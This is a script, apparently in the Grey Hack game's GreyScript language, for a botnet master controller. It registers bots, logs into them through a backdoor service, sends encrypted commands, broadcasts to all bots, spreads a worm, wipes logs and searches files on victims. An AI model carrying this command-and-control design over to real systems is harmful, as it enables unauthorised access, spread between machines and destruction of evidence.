// master_controller.gs – final corrected version
import_code("/lib/kyber_lib.gs")
import_code("/lib/lib_common.gs")
import_code("/scripts/utils/file_search.gs")
import_code("/scripts/utils/sanitize_ip.gs")

BOTNET_DIR = "/root/.botnet/bots"
COMMAND_QUEUE_DIR = "/root/.botnet/outgoing"
INCOMING_DIR = "/root/.botnet/incoming"
VERSION = "1.0"

// Security: Whitelist allowed scripts and validate arguments
allowed_scripts = ["/bin/slave.gs", "/bin/worm.gs", "/scripts/utils/wipe_logs.gs", "/scripts/utils/file_search.gs"]

validate_script_args = function(script, args)
    // Check if script is in whitelist
    if allowed_scripts.indexOf(script) == null then return false
    
    // Validate arguments - remove dangerous characters
    for arg in args
        if arg.indexOf(";") != null then return false
        if arg.indexOf("|") != null then return false
        if arg.indexOf("&") != null then return false
        if arg.indexOf("$") != null then return false
        if arg.indexOf("`") != null then return false
        if arg.indexOf("<") != null then return false
        if arg.indexOf(">") != null then return false
    end for
    
    return true
end function

get_backdoor_pass = function(ip)
    pass_file = "/root/.botnet/backdoor_pass_" + ip
    pass = retrieve_password(pass_file)
    if pass == null then
        pass = generate_random_string(16)
        store_password(pass_file, pass)
    end if
    return pass
end function

init_master = function()
    comp = get_shell.host_computer
    comp.create_folder("/root", ".botnet")
    comp.create_folder(BOTNET_DIR, "bots")
    comp.create_folder(COMMAND_QUEUE_DIR, "outgoing")
    comp.create_folder(INCOMING_DIR, "incoming")
    if not read_file("/root/.botnet/master.priv") then
        keys = Kyber.generate_keypair()
        write_file("/root/.botnet/master.priv", keys.private)
        set_permissions("/root/.botnet/master.priv", "600")
        write_file("/root/.botnet/master.pub", keys.public)
        set_permissions("/root/.botnet/master.pub", "644")
        // Set restrictive permissions on key files
        priv_file = comp.File("/root/.botnet/master.priv")
        pub_file = comp.File("/root/.botnet/master.pub")
        if priv_file then priv_file.set_permission("600")
        if pub_file then pub_file.set_permission("644")
        log_master("Generated master keypair", "INFO")
    end if
end function

register_bot = function(ip, pubkey_enc)
    priv = read_file("/root/.botnet/master.priv")
    pubkey = Kyber.decrypt_message(priv, pubkey_enc)
    write_file(BOTNET_DIR + "/" + ip + ".pub", pubkey)
    set_permissions(BOTNET_DIR + "/" + ip + ".pub", "644")
    log_master("Registered bot " + sanitize_ip(ip), "SUCCESS")
end function

send_command = function(ip, command)
    pubkey = read_file(BOTNET_DIR + "/" + ip + ".pub")
    if not pubkey then
        log_master("Bot " + sanitize_ip(ip) + " not registered", "ERROR")
        return false
    end if
    cipher = Kyber.encrypt_message(pubkey, command)
    
    // Write cipher to local temp file
    tmp_file = "/tmp/cmd_" + str(time) + ".enc"
    write_file(tmp_file, cipher)
    set_permissions(tmp_file, "600")
    
    // Connect with type check
    shell = get_shell.connect_service(ip, 22, "backdoor", get_backdoor_pass(ip))
    if typeof(shell) == "string" then
        log_master("Connect to " + sanitize_ip(ip) + " failed: " + shell, "ERROR")
        get_shell.host_computer.File(tmp_file).delete
        return false
    end if
    
    // Use correct scp method with guaranteed cleanup
    scp_result = get_shell.scp(tmp_file, "/root/.botnet/commands/", shell)
    // Always cleanup temp file regardless of scp outcome
    get_shell.host_computer.File(tmp_file).delete
    return true
end function

collect_responses = function()
    for ip in list_bots()
        shell = get_shell.connect_service(ip, 22, "backdoor", get_backdoor_pass(ip))
        if typeof(shell) == "string" then continue
        resp_dir = shell.host_computer.File("/root/.botnet/responses")
        if resp_dir == null then continue
        for f in resp_dir.get_files
            if f == null then continue
            if f.name[-4:] == ".enc" then
                cipher = f.get_content
                if cipher == null then continue
                priv = read_file("/root/.botnet/master.priv")
                if priv == null then continue
                resp = Kyber.decrypt_message(priv, cipher)
                if resp == null then continue
                log_master("Response from " + sanitize_ip(ip) + ": " + resp, "INFO")
                write_file(INCOMING_DIR + "/" + ip + "_" + f.name, resp)
                set_permissions(INCOMING_DIR + "/" + ip + "_" + f.name, "600")
                f.delete
            end if
        end for
    end for
end function

list_bots = function()
    comp = get_shell.host_computer
    bots = []
    bot_dir = comp.File(BOTNET_DIR)
    if bot_dir == null then return bots
    for f in bot_dir.get_files
        if f == null then continue
        if f.name[-4:] == ".pub" then bots.push(f.name[:-4])
    end for
    return bots
end function

search_bot_files = function(ip, pattern, flags)
    send_command(ip, "run /scripts/utils/file_search.gs " + pattern + " " + flags)
    wait(2)
    collect_responses()
end function

command_loop = function()
    print(blue("Master Controller v" + VERSION))
    print(white("Commands: list, status, run <ip> <script> [args], kill <ip> <script>, worm <ip> <depth>, search <ip> <pattern> <flags>, clean <ip>, logs, broadcast <cmd>, exit"))
    while true
        input = user_input(white("master> "))
        parts = input.split(" ")
        if parts.len == 0 then continue
        
        if parts[0] == "list" then
            bots = list_bots()
            print(white("Bots: " + bots.len + " registered"))
            for ip in bots
                print(white("  " + sanitize_ip(ip)))
            end for
        else if parts[0] == "status" then
            for ip in list_bots()
                send_command(ip, "status")
            end for
            wait(2)
            collect_responses()
        else if parts[0] == "run" then
            if parts.len < 3 then
                print(red("Usage: run <ip> <script> [args]"))
            else
                script = parts[2]
                args = parts[3:]
                if not validate_script_args(script, args) then
                    print(red("ERROR: Script not allowed or invalid arguments"))
                else
                    cmd = "run " + script + " " + (args.join(" "))
                    send_command(parts[1], cmd)
                end if
            end if
        else if parts[0] == "kill" then
            if parts.len < 3 then
                print(red("Usage: kill <ip> <script>"))
            else
                script = parts[2]
                if allowed_scripts.indexOf(script) == null then
                    print(red("ERROR: Script not allowed"))
                else
                    send_command(parts[1], "kill " + script)
                end if
            end if
        else if parts[0] == "worm" then
            if parts.len < 3 then
                print(red("Usage: worm <ip> <depth>"))
            else
                send_command(parts[1], "worm /root/.botnet/master.pub " + parts[2])
            end if
        else if parts[0] == "clean" then
            if parts.len < 2 then
                print(red("Usage: clean <ip>"))
            else
                send_command(parts[1], "clean")
            end if
        else if parts[0] == "search" then
            if parts.len < 4 then
                print(red("Usage: search <ip> <pattern> <flags>"))
            else
                search_bot_files(parts[1], parts[2], parts[3])
            end if
        else if parts[0] == "logs" then
            for ip in list_bots()
                // Use 'read' command (slave now handles it)
                send_command(ip, "read /root/.botnet/log.txt")
            end for
            collect_responses()
        else if parts[0] == "broadcast" then
            if parts.len < 2 then
                print(red("Usage: broadcast <command>"))
            else
                cmd = parts[1:].join(" ")
                for ip in list_bots()
                    send_command(ip, cmd)
                end for
            end if
        else if parts[0] == "exit" then
            break
        else
            print(red("Unknown command: " + parts[0]))
        end if
    end while
end function

init_master()
command_loop()
